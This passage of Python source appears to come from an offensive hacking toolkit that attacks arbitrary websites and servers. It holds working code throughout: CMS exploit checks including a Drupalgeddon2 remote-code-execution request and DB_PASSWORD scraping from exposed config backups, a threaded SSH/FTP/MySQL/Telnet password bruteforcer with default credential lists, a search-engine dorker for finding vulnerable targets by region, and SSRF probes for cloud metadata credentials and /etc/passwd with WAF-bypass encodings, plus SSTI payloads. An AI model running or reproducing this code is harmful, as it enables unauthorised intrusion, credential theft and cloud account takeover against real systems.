            elif "drupal" in html or "/sites/default/" in html or "drupal.js" in html:
                self.cms = "Drupal"
            elif "magento" in html or "mage-cache" in html:
                self.cms = "Magento"
            return self.cms
        except: return None

    def wp_exploit(self):
        exploits = []
        print(f"\n  {BOLD}{C}WORDPRESS EXPLOIT{N}")

        # Check wp-json
        try:
            r = self.bypass.get(f"{self.url}/wp-json/wp/v2/users", timeout=8)
            if r.status_code == 200:
                try:
                    users = json.loads(r.text)
                    if users:
                        print(f"  {R}[!]{N} WP REST API exposed! Users:")
                        for u in users[:5]:
                            print(f"      {Y}{u.get('name','?')}{N} ({u.get('slug','?')})")
                        exploits.append("REST API user enum")
                except: pass
        except: pass

        # Check xmlrpc
        try:
            r = self.bypass.post(f"{self.url}/xmlrpc.php", data="<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>",
                headers={"Content-Type": "text/xml"}, timeout=8)
            if r.status_code == 200 and "methodName" in r.text:
                print(f"  {Y}[!]{N} XML-RPC enabled — brute force vectors available")
                exploits.append("XML-RPC enabled")
        except: pass

        # Check debug log
        for debug in ["wp-content/debug.log", "wp-config.php.bak", "wp-config.php~", ".wp-config.php.swp"]:
            try:
                r = self.bypass.get(f"{self.url}/{debug}", timeout=8)
                if r.status_code == 200 and len(r.text) > 100:
                    print(f"  {R}[!]{N} Sensitive file exposed: {Y}{self.url}/{debug}{N}")
                    if "DB_PASSWORD" in r.text:
                        pwds = re.findall(r"define\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)", r.text)
                        if pwds:
                            print(f"  {R}{BOLD}DB_PASSWORD: {Y}{pwds[0]}{N}")
                    exploits.append(f"Sensitive file: {debug}")
            except: pass

        # Auto upload webshell via theme editor if admin creds known
        print(f"\n  {D}WordPress exploits checked. Use 'webshell' module to upload shell.{N}")

        if not exploits:
            print(f"  {G}✔{N} No obvious WordPress vulns (try deeper scan)")
        return exploits

    def joomla_exploit(self):
        exploits = []
        print(f"\n  {BOLD}{C}JOOMLA EXPLOIT{N}")
        # Check Joomla version
        try:
            r = self.bypass.get(f"{self.url}/administrator/manifests/files/joomla.xml", timeout=8)
            if r.status_code == 200:
                vm = re.search(r'<version>([^<]+)', r.text)
                if vm:
                    print(f"  {C}▶{N} Joomla version: {Y}{vm.group(1)}{N}")
                    exploits.append(f"Version: {vm.group(1)}")
        except: pass

        # Check com_user SQLi
        try:
            r = self.bypass.get(f"{self.url}/index.php?option=com_users&view=users", timeout=8)
            if r.status_code == 200 and len(r.text) > 100:
                print(f"  {Y}[!]{N} com_users view accessible")
                exploits.append("com_users accessible")
        except: pass
        return exploits

    def drupal_exploit(self):
        exploits = []
        print(f"\n  {BOLD}{C}DRUPAL EXPLOIT{N}")
        # Check drupal version
        try:
            r = self.bypass.get(f"{self.url}/CHANGELOG.txt", timeout=8)
            if r.status_code == 200:
                vm = re.search(r'Drupal (\d+\.\d+)', r.text)
                if vm:
                    print(f"  {C}▶{N} Drupal version: {Y}{vm.group(1)}{N}")
                    exploits.append(f"Version: {vm.group(1)}")
        except: pass
        # Drupalgeddon2 check
        try:
            r = self.bypass.post(f"{self.url}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                data={"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#markup]": "echo DRUPALTEST"}, timeout=8)
            if r.status_code == 200 and "DRUPALTEST" in r.text:
                print(f"  {R}[!]{N} {BOLD}Drupalgeddon2 (CVE-2018-7600) — RCE!{N}")
                exploits.append("Drupalgeddon2 RCE")
        except: pass
        return exploits

    def run(self):
        header("CMS EXPLOITER — AUTO CMS HACK")
        print(f"  {C}◉{N} URL: {Y}{self.url}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable.\n"); return []

        cms = self.detect()
        if not cms:
            print(f"  {Y}⚠{N} CMS not detected (or custom)\n")
            return []

        print(f"  {G}✔{N} Detected: {Y}{cms}{N}\n")
        if cms == "WordPress":
            self.wp_exploit()
        elif cms == "Joomla":
            self.joomla_exploit()
        elif cms == "Drupal":
            self.drupal_exploit()
        else:
            print(f"  {Y}⚠{N} No specific exploits for {cms}")
        print()
        return self.vulns


# ══════════════════════════════════════════════════════
#  SERVICE BRUTEFORCER — Auto Brute SSH / FTP / MySQL
# ══════════════════════════════════════════════════════

class ServiceBruteforcer:
    COMMON_USERS = ["root", "admin", "administrator", "user", "test", "guest", "oracle",
                    "mysql", "postgres", "www-data", "nobody", "backup", "operator", "demo",
                    "manager", "supervisor", "ftp", "mail", "info", "support", "sales", "admin1"]
    COMMON_PASS = ["root", "admin", "password", "123456", "root123", "admin123", "P@ssw0rd",
                   "password123", "toor", "qwerty", "letmein", "admin12345", "12345678",
                   "passw0rd", "Passw0rd", "changeme", "secret", "1234", "abc123",
                   "welcome", "test", "guest", "manager", "backup", "demo",
                   "1q2w3e4r", "123qwe", "p@ssw0rd", "0", "1", "123",
                   "password1", "root123!", "admin!", "mysql", "raspberry",
                   "123456789", "qwerty123", "letmein123", "Passw0rd!", "admin2024",
                   "root2024", "password!", "test123", "admin123!", "root1234"]

    PORTS = {"ssh": 22, "ftp": 21, "mysql": 3306, "telnet": 23, "postgres": 5432, "mssql": 1433}

    def __init__(self, target, port=None, service="ssh", wordlist_user=None, wordlist_pass=None, threads=5):
        self.target = target
        self.port = port
        self.service = service.lower()
        self.threads = min(threads, 50)
        self.found = []
        self.lock = threading.Lock()
        self.q = Queue()
        self.total = 0
        self.done = 0
        self.start_time = None
        self._load_wordlists(wordlist_user, wordlist_pass)

    def _load_wordlists(self, wl_u, wl_p):
        self.users = list(self.COMMON_USERS)
        self.passes = list(self.COMMON_PASS)
        wd = os.path.join(os.path.dirname(__file__), "wordlists")
        for path, attr in [(wl_u or os.path.join(wd, "usernames.txt"), "users"),
                           (wl_p or os.path.join(wd, "passwords.txt"), "passes")]:
            if os.path.exists(path):
                with open(path, errors="ignore") as f:
                    lines = [l.strip() for l in f if l.strip()]
                    if lines:
                        setattr(self, attr, lines)

    def _ssh_alive(self, timeout=2.5):
        """Pre-check SSH banner via raw socket. Returns True if server responds with SSH-."""
        try:
            import socket as _sock
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((self.target, self.port or 22))
            banner = s.recv(64).decode(errors="ignore")
            s.close()
            return banner.startswith("SSH-")
        except: return False

    def _try_ssh(self, user, pwd):
        try:
            import logging
            logging.getLogger("paramiko").setLevel(logging.CRITICAL)
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(self.target, port=self.port or 22, username=user, password=pwd,
                           timeout=4, look_for_keys=False, allow_agent=False)
            _, stdout, _ = client.exec_command("id;hostname", timeout=4)
            o = stdout.read().decode().strip()[:100]
            client.close()
            return f"SSH: {o}"
        except ImportError: return "SKIP"
        except paramiko.AuthenticationException: return None
        except: return None

    def _try_ftp(self, user, pwd):
        try:
            import ftplib
            ftp = ftplib.FTP(timeout=4)
            ftp.connect(self.target, self.port or 21)
            ftp.login(user, pwd)
            ftp.quit()
            return f"FTP: {user}:{pwd}"
        except ftplib.error_perm: return None
        except ImportError: return "SKIP"
        except: return None

    def _try_mysql(self, user, pwd):
        try:
            import pymysql
            conn = pymysql.connect(host=self.target, port=self.port or 3306, user=user, password=pwd, connect_timeout=4)
            cur = conn.cursor()
            cur.execute("SELECT CONCAT(version(),'|',user(),'|',database())")
            r = cur.fetchone()[0]
            conn.close()
            return f"MYSQL: {r[:80]}"
        except ImportError: return "SKIP"
        except: return None

    def _try_postgres(self, user, pwd):
        try:
            import psycopg2
            conn = psycopg2.connect(host=self.target, port=self.port or 5432, user=user, password=pwd, connect_timeout=6)
            cur = conn.cursor()
            cur.execute("SELECT CONCAT(version()::text,'|',current_user)")
            r = cur.fetchone()[0]
            conn.close()
            return f"POSTGRES: {r[:80]}"
        except ImportError: return "SKIP"
        except: return None

    def _try_telnet(self, user, pwd):
        try:
            import telnetlib
            tn = telnetlib.Telnet(self.target, self.port or 23, timeout=6)
            tn.read_until(b"login: ", timeout=3)
            tn.write(user.encode() + b"\n")
            tn.read_until(b"Password: ", timeout=3)
            tn.write(pwd.encode() + b"\n")
            result = tn.read_some().decode(errors="ignore")
            tn.close()
            if "incorrect" not in result.lower() and "failed" not in result.lower():
                return f"TELNET: {user}:{pwd}"
        except ImportError: return "SKIP"
        except: pass
        return None

    def _worker(self):
        while True:
            try: user, pwd = self.q.get_nowait()
            except: break
            t = getattr(self, f"_try_{self.service}", None)
            if not t: break
            result = t(user, pwd)
            if result:
                if result == "SKIP":
                    with self.lock:
                        if not hasattr(self, '_sw'):
                            print(f"\n  {Y}⚠{N} Install library for {self.service} (pip install paramiko pymysql psycopg2)")
                            self._sw = True
                else:
                    with self.lock:
                        self.found.append({"u": user, "p": pwd, "r": result})
                        print(f"\n  {G}{BOLD}[✔]{N} {Y}{user}{N}:{Y}{pwd}{N} {D}{result[:50]}{N}")
            with self.lock:
                self.done += 1
                if self.done % max(1, self.total//50) == 0 or self.done == self.total:
                    e = time.time() - self.start_time
                    r = self.done/e if e>0 else 0
                    print(f"  {D}[{self.done}/{self.total}] {self.done*100//self.total}% | {r:.0f}/s{N}", end="\r")
            self.q.task_done()

    def run(self):
        header(f"SERVICE BRUTEFORCER — {self.service.upper()}")
        p = self.port or self.PORTS.get(self.service, 22)
        self.total = len(self.users) * len(self.passes)
        print(f"  {C}◉{N} {self.target}:{p} | Users: {len(self.users)} | Pass: {len(self.passes)} | Combos: {self.total} | Threads: {self.threads}")
        print(f"  {D}{'─'*50}{N}")
        if not hasattr(self, f"_try_{self.service}"):
            print(f"  {R}✘{N} Services: {', '.join(self.PORTS.keys())}\n"); return []
        if self.service == "ssh":
            print(f"  {C}◉{N} Pre-checking SSH banner...", end=" ")
            if self._ssh_alive():
                print(f"{G}alive{N}")
            else:
                print(f"{R}no response{N}  {Y}⚠ Skip — server not responding with SSH banner{N}")
                print(f"  {D}  Tip: the port may be filtered or service is not SSH{N}\n")
                return []
        for u in self.users:
            for p in self.passes:
                self.q.put((u, p))
        self.start_time = time.time()
        for _ in range(min(self.threads, self.total)):
            threading.Thread(target=self._worker, daemon=True).start()
        self.q.join()
        e = time.time() - self.start_time
        print(f"\n  {D}{'─'*50}{N}")
        if self.found:
            print(f"  {R}{BOLD}⚠ {len(self.found)} found in {e:.1f}s!{N}")
            for c in self.found: print(f"  {G}✔{N} {Y}{c['u']}{N}:{Y}{c['p']}{N}")
        else: print(f"  {R}✘{N} None ({self.total} tries, {e:.1f}s)")
        print(); return self.found


# ══════════════════════════════════════════════════════
#  SERVICE EXPLOITER — SSH / FTP / MySQL / SMTP
# ══════════════════════════════════════════════════════

class ServiceExploiter:
    def __init__(self, target, username, password, port=None):
        self.target = target
        self.username = username
        self.password = password
        self.port = port
        self.results = []

    def ssh_login(self):
        """Attempt SSH login using paramiko if available."""
        try:
            import paramiko
        except ImportError:
            return "paramiko not installed (pip install paramiko)"

        port = self.port or 22
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(self.target, port=port, username=self.username, password=self.password,
                           timeout=6, look_for_keys=False, allow_agent=False)
            stdin, stdout, stderr = client.exec_command("id; whoami; hostname", timeout=6)
            output = stdout.read().decode() + stderr.read().decode()
            client.close()
            return f"SSH LOGIN SUCCESS!\n{output}"
        except Exception as e:
            return f"SSH failed: {e}"

    def ftp_login(self):
        """Attempt FTP login."""
        port = self.port or 21
        try:
            import ftplib
            ftp = ftplib.FTP()
            ftp.connect(self.target, port, timeout=10)
            ftp.login(self.username, self.password)
            files = []
            try:
                ftp.dir(files.append)
            except: pass
            ftp.quit()
            return f"FTP LOGIN SUCCESS!\nFiles: {len(files)} entries"
        except Exception as e:
            return f"FTP failed: {e}"

    def mysql_login(self):
        """Attempt MySQL login."""
        port = self.port or 3306
        try:
            import pymysql
            conn = pymysql.connect(host=self.target, port=port, user=self.username, password=self.password, connect_timeout=10)
            cursor = conn.cursor()
            cursor.execute("SELECT version(), user(), database()")
            row = cursor.fetchone()
            conn.close()
            return f"MYSQL LOGIN SUCCESS!\nVersion: {row[0]}, User: {row[1]}"
        except ImportError:
            return "pymysql not installed (pip install pymysql)"
        except Exception as e:
            return f"MySQL failed: {e}"

    def run(self, services=None):
        if services is None:
            services = ["ssh", "ftp", "mysql"]
        header("SERVICE EXPLOITER — CREDENTIAL TESTING")
        print(f"  {C}◉{N} Target: {Y}{self.target}{N}")
        print(f"  {C}◉{N} Creds : {Y}{self.username}:{self.password}{N}\n")

        for svc in services:
            print(f"  {C}▶{N} Testing {Y}{svc.upper()}{N}...")
            method = getattr(self, f"{svc}_login", None)
            if method:
                result = method()
                if "SUCCESS" in str(result):
                    print(f"  {G}[✔]{N} {result}")
                    self.results.append({"service": svc, "status": "SUCCESS", "detail": str(result)[:200]})
                else:
                    print(f"  {R}[✘]{N} {result}")
            else:
                print(f"  {Y}[−]{N} No handler for {svc}")
        print()
        return self.results


# ══════════════════════════════════════════════════════
#  GOOGLE DORKER — Find targets via search engines
# ══════════════════════════════════════════════════════

class GoogleDorker:
    DORKS = {
        "sqli": [
            "inurl:php?id=", "inurl:asp?id=", "inurl:aspx?id=", "inurl:jsp?id=",
            "inurl:news.php?id=", "inurl:product.php?id=", "inurl:article.php?id=",
            "inurl:page.php?id=", "inurl:item.php?id=", "inurl:cat.php?id=",
            "inurl:detail.php?id=", "inurl:view.php?id=", "inurl:show.php?id=",
            "inurl:index.php?id=", "inurl:main.php?id=", "inurl:content.php?id=",
            "inurl:post.php?id=", "inurl:story.php?id=", "inurl:section.php?id=",
            "inurl:thread.php?id=", "inurl:topic.php?id=", "inurl:reply.php?id=",
            "inurl:comment.php?id=", "inurl:profile.php?id=", "inurl:member.php?id=",
            "inurl:user.php?id=", "inurl:gallery.php?id=", "inurl:photo.php?id=",
            "inurl:video.php?id=", "inurl:download.php?id=", "inurl:file.php?id=",
            "inurl:image.php?id=", "inurl:doc.php?id=", "inurl:read.php?id=",
            "inurl:news.php?item=", "inurl:news.php?cat=", "inurl:product.php?cat=",
            "inurl:article.php?cat=", "inurl:news.php?page=", "inurl:index.php?page=",
            "inurl:index.php?cat=", "inurl:blog.php?id=", "inurl:portfolio.php?id=",
            "inurl:event.php?id=", "inurl:service.php?id=", "inurl:team.php?id=",
            "inurl:testimonial.php?id=", "inurl:faq.php?id=", "inurl:review.php?id=",
            "inurl:course.php?id=", "inurl:lesson.php?id=", "inurl:quiz.php?id=",
            "inurl:order.php?id=", "inurl:invoice.php?id=", "inurl:ticket.php?id=",
            "inurl:?uid=", "inurl:?cid=", "inurl:?pid=", "inurl:?sid=",
            "inurl:?gid=", "inurl:?bid=", "inurl:?mid=", "inurl:?nid=",
            "inurl:?aid=", "inurl:?tid=", "inurl:?fid=", "inurl:?did=",
        ],
        "lfi": [
            "inurl:index.php?file=", "inurl:?page=include", "inurl:?page=../../",
            "inurl:?file=../../", "inurl:?dir=../../", "inurl:?path=../../",
            "inurl:?include=../../", "inurl:?require=../../", "inurl:?template=",
            "inurl:?view=", "inurl:?load=", "inurl:?content=", "inurl:?document=",
            "inurl:?folder=", "inurl:?root=", "inurl:?inc=", "inurl:?locate=",
            "inurl:?show=", "inurl:?pg=", "inurl:?page=php://", "inurl:?file=php://",
            "inurl:?page=data://", "inurl:?file=data://", "inurl:?page=expect://",
            "inurl:?page=file://", "inurl:?file=file://",
        ],
        "rfi": [
            "inurl:?file=http://", "inurl:?page=http://", "inurl:?include=http://",
            "inurl:?load=http://", "inurl:?path=http://", "inurl:?template=http://",
            "inurl:?view=http://", "inurl:?content=http://", "inurl:?document=http://",
            "inurl:?src=http://", "inurl:?data=http://", "inurl:?url=http://",
        ],
        "admin": [
            "inurl:/admin", "inurl:/administrator", "inurl:/login",
            "intitle:\"admin login\"", "inurl:/admin/login.php", "inurl:/admin/index.php",
            "inurl:/admin/admin.php", "inurl:/admin/cp.php", "inurl:/admin/panel.php",
            "inurl:/admin/dashboard.php", "inurl:/admin/home.php",
            "inurl:/management", "inurl:/panel", "inurl:/cpanel",
            "inurl:/secure", "inurl:/admin_area", "inurl:/sysadmin",
            "inurl:/controlpanel", "inurl:/backoffice", "inurl:/webadmin",
            "intitle:\"control panel\"", "intitle:\"administration\"",
        ],
        "wp": [
            "inurl:/wp-admin", "inurl:/wp-content", "intitle:\"WordPress\" inurl:\"wp-\"",
            "inurl:/wp-content/uploads/", "inurl:/wp-includes/", "inurl:/wp-config",
            "inurl:/wp-login.php", "inurl:/wp-admin/admin-ajax.php",
            "inurl:/wp-content/plugins/", "inurl:/wp-content/themes/",
            "inurl:/wp-content/backup-", "inurl:/wp-content/debug.log",
            "inurl:/wp-json/", "inurl:/xmlrpc.php",
            "inurl:/wp-admin?page=", "inurl:/?p=",
        ],
        "joomla": [
            "inurl:/index.php?option=com_", "inurl:/administrator/",
            "inurl:/components/com_", "inurl:/modules/mod_",
            "inurl:/plugins/", "inurl:/templates/",
            "inurl:/language/", "inurl:/cache/",
            "inurl:/logs/", "inurl:/tmp/",
            "inurl:/components/com_joomla", "inurl:/index.php?option=com_users",
            "inurl:/index.php?option=com_content", "inurl:/index.php?option=com_config",
        ],
        "phpinfo": [
            "inurl:phpinfo.php", "intitle:\"phpinfo()\"", "ext:php intitle:phpinfo",
            "inurl:info.php", "inurl:test.php intitle:phpinfo",
            "inurl:infos.php", "inurl:php_info.php", "inurl:phpversion.php",
            "inurl:system.php?phpinfo", "inurl:phpinfo.php?var=",
        ],
        "upload": [
            "inurl:upload.php", "inurl:file.php", "inurl:uploader",
            "inurl:filemanager", "inurl:upload/", "inurl:uploads/",
            "inurl:files/", "inurl:fileadmin/", "inurl:file_upload",
            "inurl:uploadify", "inurl:plupload", "inurl:dropzone",
            "inurl:upload.cgi", "inurl:upload.asp", "inurl:upload.aspx",
            "inurl:file_upload.php", "inurl:simple_upload.php",
            "inurl:ajax_upload.php", "inurl:image_upload.php",
            "inurl:single_upload.php", "inurl:multi_upload.php",
        ],
        "backup": [
            "ext:bak", "ext:old", "ext:swp", "ext:sql inurl:backup",
            "ext:tar inurl:backup", "ext:zip inurl:backup",
            "inurl:/backup/", "inurl:/bak/", "inurl:/old/",
            "inurl:/db_backup", "inurl:/database_backup",
            "inurl:/sql_backup", "inurl:/backup.sql",
            "inurl:/dump.sql", "inurl:/db.sql",
            "inurl:/wp-config.bak", "inurl:/.git/config",
        ],
        "panel": [
            "inurl:/panel", "inurl:/cpanel", "inurl:/whm",
            "inurl:/plesk", "inurl:/webmin", "inurl:/vesta",
            "inurl:/sentora", "inurl:/directadmin", "inurl:/ispconfig",
            "inurl:/kloxo", "inurl:/zpanel", "inurl:/cwp",
            "inurl:/aaamta", "inurl:/configserver",
            "intitle:\"login\" webmail", "inurl:/webmail",
        ],
        "config": [
            "ext:cfg \"database_password\"", "ext:sql \"INSERT INTO\"",
            "ext:env DB_PASSWORD", "inurl:/config/", "inurl:/configuration/",
            "inurl:/settings/", "inurl:/includes/config",
            "inurl:/config.php", "inurl:/configuration.php",
            "ext:xml \"password\"", "ext:ini \"password\"",
            "ext:conf \"password\"", "ext:yml \"database\"",
            "ext:json \"password\"", "ext:yaml \"database_password\"",
        ],
        "api": [
            "inurl:/api/", "inurl:/api/v1", "inurl:/api/v2",
            "inurl:/graphql", "inurl:/swagger", "inurl:/docs/",
            "inurl:/openapi", "inurl:/api/docs", "inurl:/api/documentation",
            "inurl:/rest/api", "inurl:/api/swagger", "inurl:/api/rest",
            "inurl:/api/login", "inurl:/api/auth",
        ],
        "exposed": [
            "intitle:\"index of\" admin", "intitle:\"index of\" backup",
            "intitle:\"index of\" config", "intitle:\"index of\" database",
            "intitle:\"index of\" mysql", "intitle:\"index of\" password",
            "intitle:\"index of\" secret", "intitle:\"index of\" .git",
            "intitle:\"index of\" .env", "intitle:\"index of\" logs",
            "intitle:\"index of\" /cgi-bin", "intitle:\"index of\" private",
            "intitle:\"index of\" src", "intitle:\"directory listing\" password",
        ],
        "cve": [
            "inurl:?option=com_", "inurl:?page=user", "inurl:?id=1 union",
            "inurl:?option=com_content", "inurl:?option=com_user",
            "inurl:?option=com_jce", "inurl:?option=com_jdownloads",
            "inurl:?option=com_seblod", "inurl:?option=com_fabrik",
            "inurl:?option=com_akeeba", "inurl:?option=com_virtuemart",
            "inurl:?option=com_jomcom", "inurl:?option=com_easyblog",
            "inurl:?option=com_kunena", "inurl:?option=com_rsform",
        ],
        "param": [
            "inurl:?search=", "inurl:?query=", "inurl:?q=",
            "inurl:?s=", "inurl:?keyword=", "inurl:?term=",
            "inurl:?lang=", "inurl:?theme=", "inurl:?style=",
            "inurl:?color=", "inurl:?width=", "inurl:?height=",
            "inurl:?limit=", "inurl:?offset=", "inurl:?start=",
            "inurl:?sort=", "inurl:?order=", "inurl:?by=",
            "inurl:?searchword=", "inurl:?search term=",
        ],
        "all": [
            "inurl:php?id=", "inurl:admin", "inurl:upload.php",
            "intitle:phpinfo", "inurl:/wp-content", "inurl:/backup",
            "inurl:/api/v1", "inurl:/panel/login", "inurl:/index.php?option=com_",
            "inurl:?page=../../", "inurl:?file=http://",
            "intitle:\"index of\" admin", "ext:env DB_PASSWORD",
            "inurl:/config/", "inurl:/.git/config",
        ],
    }
    REGION_DOMAINS = {"id": ".id", "my": ".my", "sg": ".sg", "jp": ".jp", "kr": ".kr",
                      "cn": ".cn", "us": ".com", "uk": ".uk", "de": ".de", "fr": ".fr",
                      "au": ".au", "br": ".br", "in": ".in", "ru": ".ru", "global": ""}

    def __init__(self, dork=None, category="sqli", region="global", pages=2, proxy=None):
        self.dork = dork
        self.category = category
        self.region = region
        self.pages = min(pages, 5)
        self.proxy = proxy
        self.results = []
        self.proxies = {"http": proxy, "https": proxy} if proxy else None

    def _build_queries(self):
        dorks = [self.dork] if self.dork else self.DORKS.get(self.category, self.DORKS["all"])
        region_domain = self.REGION_DOMAINS.get(self.region, "")
        if region_domain:
            return [f"{d} site:{region_domain}" for d in dorks]
        return dorks

    def _search_ddgs(self, query, max_results=20):
        """DuckDuckGo API via ddgs."""
        from ddgs import DDGS
        try:
            with DDGS() as ddgs:
                results = list(ddgs.text(query, max_results=max_results))
                return [r.get("href","") for r in results if r.get("href")]
        except: return []

    def _validate(self, url, timeout=5):
        try:
            r = requests.get(url, timeout=timeout, allow_redirects=True, verify=False,
                             headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                             proxies=self.proxies)
            if r.status_code in (200, 301, 302, 403):
                t = ""
                m = re.search(r'<title[^>]*>(.*?)</title>', r.text, re.I|re.S)
                if m: t = m.group(1).strip()[:80]
                return {"url": url, "status": r.status_code, "title": t,
                        "server": r.headers.get("Server","")[:20],
                        "ct": r.headers.get("Content-Type","")[:30]}
        except: pass
        return None

    def run(self):
        header("GOOGLE DORKER — TARGET DISCOVERY")
        queries = self._build_queries()
        print(f"  {C}◉{N} Category: {Y}{self.category}{N}  Region: {Y}{self.region}{N}  Max targets: {Y}{self.pages*10}{N}")
        print(f"  {C}◉{N} Query(s): {len(queries)}")
        for q in queries[:10]:
            print(f"    {W}{q[:90]}{N}")
        if len(queries) > 10:
            print(f"    {D}... and {len(queries)-10} more{N}")
        print()

        dork_limit = min(len(queries), 12)
        all_raw = set()
        for qi, q in enumerate(queries[:dork_limit], 1):
            print(f"  {Y}[{qi}/{dork_limit}]{N} {W}{q[:70]}{N}")
            for attempt in range(2):
                print(f"    {C}▶{N} Searching DuckDuckGo...", end="\r")
                urls = self._search_ddgs(q, max_results=self.pages*10)
                if urls:
                    print(f"    {G}✔{N} {len(urls)} URLs found")
                    all_raw.update(urls)
                    break
                print(f"    {Y}−{N} No results. {attempt == 0 and 'Retrying...' or ''}", end="" if attempt == 0 else "\n")

        if not all_raw:
            print(f"\n  {R}✘{N} No results. Try different dork/region or use custom -d.\n")
            return []

        unique = sorted(all_raw)[:80]
        print(f"\n  {C}▶{N} Validating {len(unique)} unique URLs...")
        valid = []
        for i, u in enumerate(unique, 1):
            print(f"    {C}[{i}/{len(unique)}]{N} {W}{u[:60]}{N}...", end="\r")
            v = self._validate(u)
            if v:
                valid.append(v)
                print(f"    {G}✔{N} {W}{u[:55]:<55}{N}  {v['status']}  {v['server']:<15} {v['title'][:30]}")

        self.results = valid
        fname = f"dork_{self.category}_{self.region}.txt"
        with open(fname, "w") as f:
            for v in valid: f.write(f"{v['url']} | HTTP {v['status']} | {v['server']} | {v['title']}\n")

        print(f"\n  {G}{'═'*50}{N}")
        print(f"  {G}✔{N} {len(valid)} valid target(s)")
        print(f"  {C}📁{N} Saved: {Y}{fname}{N}")
        print(f"\n  {D}Tip: pipe results to autohack:{N}")
        for v in valid[:5]:
            print(f"    {C}autohack{N} {Y}{v['url']}{N} --lhost YOUR_IP")
        print()
        return valid


# ══════════════════════════════════════════════════════
#  ADVANCED EXPLOITERS — SSRF / SSTI / XXE / CMDi / NoSQL / JWT / GraphQL
# ══════════════════════════════════════════════════════

class SSRFExploiter:
    """Server-Side Request Forgery — probe internal services & cloud metadata."""
    INTERNAL_URLS = [
        "http://169.254.169.254/latest/meta-data/",       # AWS
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        "http://100.100.100.200/latest/meta-data/",       # Alibaba
        "http://127.0.0.1:22", "http://127.0.0.1:80",
        "http://127.0.0.1:3306", "http://127.0.0.1:6379",
        "http://127.0.0.1:8080", "http://127.0.0.1:8443",
        "http://127.0.0.1:9200", "http://127.0.0.1:27017",
        "http://localhost:22", "http://localhost:80",
        "file:///etc/passwd", "file:///proc/self/environ",
    ]
    # CDN/WAF bypass IP variations for 127.0.0.1 and 169.254.169.254
    BYPASS_ALIASES = {
        "127.0.0.1": ["127.1", "0x7f000001", "2130706433", "0177.0.0.1", "0x7f.0x0.0x0.0x1", "::1", "127.0.0.2", "127.0.0.3"],
        "169.254.169.254": ["169.254.169.254.xip.io", "169.254.169.254.nip.io",
                            "0xa9fea9fe", "2852039166",
                            "0254.0376.0251.0254", "0xa9.0xfe.0xa9.0xfe",
                            "http://metadata.google.internal/", "http://metadata.goog/",
                            "http://instance-data/", "http://instance-data.compute.internal/"],
    }
    def __init__(self, target, param, bypass=None):
        self.target = target.rstrip("/")
        self.param = param
        self.bypass = bypass or BypassEngine(target)
        self.results = {"cloud": [], "internal": [], "file_read": []}
    def _send(self, url, method="GET", data=None, extra_headers=None):
        try:
            injected = self.target.replace(self.param+"=", self.param+"="+url, 1) if f"{self.param}=" in self.target else self.target
            hdrs = dict(extra_headers or {})
            if "metadata.google" in url:
                hdrs["Metadata-Flavor"] = "Google"
            if "computeMetadata" in url:
                hdrs["Metadata-Flavor"] = "Google"
            if method == "POST":
                resp = self.bypass.post(injected, data=data, headers=hdrs or None, timeout=6)
            else:
                resp = self.bypass.get(injected, headers=hdrs or None, timeout=6)
            return resp.text if resp else ""
        except: return ""
    def _try_variants(self, base_url):
        """Try DNS rebinding / IP encoding bypasses for critical endpoints."""
        results = []
        for orig, aliases in self.BYPASS_ALIASES.items():
            if orig in base_url:
                for alias in aliases[:4]:
                    variant = base_url.replace(orig, alias)
                    txt = self._send(variant)
                    if txt and len(txt) > 10:
                        results.append({"variant": variant, "body": txt[:200]})
        return results
    def scan(self):
        print(f"  {C}◉{N} Probing {len(self.INTERNAL_URLS)} internal/cloud endpoints...")
        for url in self.INTERNAL_URLS:
            txt = self._send(url)
            if txt and len(txt) > 10 and "error" not in txt.lower()[:50]:
                cat = "cloud" if "169.254" in url or "metadata" in url or "100.100" in url else ("file" if url.startswith("file:") else "internal")
                print(f"  {G}✔{N} {W}{url[:55]}{N} → {len(txt)}b")
                self.results[cat].append({"endpoint": url, "body": txt[:500]})
                if cat == "cloud" and any(k in txt.lower() for k in ("secret","accesskey","token","password","certificate")):
                    print(f"  {R}{BOLD}⚠ CLOUD CREDENTIAL LEAK!{N}")
        # Try DNS rebinding/encoding bypasses for cloud metadata
        print(f"  {C}◉{N} Trying IP encoding / DNS rebinding bypasses...")
        for meta_url in [u for u in self.INTERNAL_URLS if "169.254" in u or "metadata" in u]:
            variants = self._try_variants(meta_url)
            for v in variants:
                print(f"  {G}✔{N} Bypass {W}{v['variant'][:50]}{N} → {len(v['body'])}b")
                self.results["cloud"].append({"endpoint": v["variant"], "body": v["body"]})
        if not any(self.results.values()):
            print(f"  {Y}−{N} No SSRF vector detected")
        else:
            total = sum(len(v) for v in self.results.values())
            print(f"  {C}◉{N} Total SSRF hits: {Y}{total}{N}")
        return self.results

class SSTIExploiter:
    """Server-Side Template Injection — detect & exploit (Jinja2/Twig/Freemarker/etc)."""
    TESTS = [
        ("{{7*7}}", "49"), ("${7*7}", "49"), ("#{7*7}", "49"),
        ("{{''.class.mro[2].subclasses()}}", "subclasses"),
        ("{{config}}", "config"), ("{{self}}", "<Template"),
        ("{{7*'7'}}", "7777777"), ("${7*'7'}", "7777777"),
    ]
    # WAF bypass: URL-encoded, hex-encoded, newline-injected variants
    BYPASS_ENCODINGS = [
        lambda p: p,
        lambda p: p.replace("{{", "%7b%7b").replace("}}", "%7d%7d"),
        lambda p: p.replace("{{", "\\x7b\\x7b").replace("}}", "\\x7d\\x7d"),
